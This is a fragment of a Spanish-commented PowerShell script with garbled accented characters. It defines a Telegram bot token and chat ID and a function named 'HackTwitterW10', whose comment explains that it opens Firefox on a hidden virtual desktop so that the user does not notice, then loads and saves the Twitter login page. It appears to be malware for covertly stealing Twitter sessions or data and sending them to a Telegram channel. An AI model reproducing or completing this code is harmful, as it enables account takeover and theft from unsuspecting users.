...
$BotToken = "6728572440:AAEvAO1nqkag_dsO01UnPc1kisPy88Fl6-8"
$ChatID = '-1002108252535'
...
function HackTwitterW10 {
    <#
    Crearб un nuevo dekstop virtual e iniciarб ahн el firefox y guardarб el html, como es un desktop virtual el usuario no se enterarб de lo que pasa
    Esta funcion solo es vбlida para W10.
    Manuales: 
...
"@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    
    ...
    # Espera 10 segundos a cargar completamente la pбgina
    Start-sleep -Seconds 10

    # Activa la ventana con el nombre: 'Iniciar sesiуn en Twitter'
